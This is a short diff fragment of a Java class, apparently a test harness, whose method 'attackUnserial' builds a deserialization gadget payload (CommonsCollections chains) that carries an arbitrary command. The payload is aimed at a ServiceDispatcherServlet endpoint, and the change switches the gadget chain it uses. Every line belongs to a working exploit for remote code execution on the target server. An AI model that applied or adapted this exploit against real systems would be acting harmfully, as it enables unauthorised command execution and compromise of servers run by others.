@@ -19,7 +19,7 @@ public class NCTest {
 
     public static void attackUnserial(String url, String cmd) throws Exception {
         url = url + "/ServiceDispatcherServlet/xxxx";
-        ObjectPayload<?> payload = CommonsCollections7.class.newInstance();
+        ObjectPayload<?> payload = CommonsCollections1.class.newInstance();
         Object obj = payload.getObject(cmd);
 
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
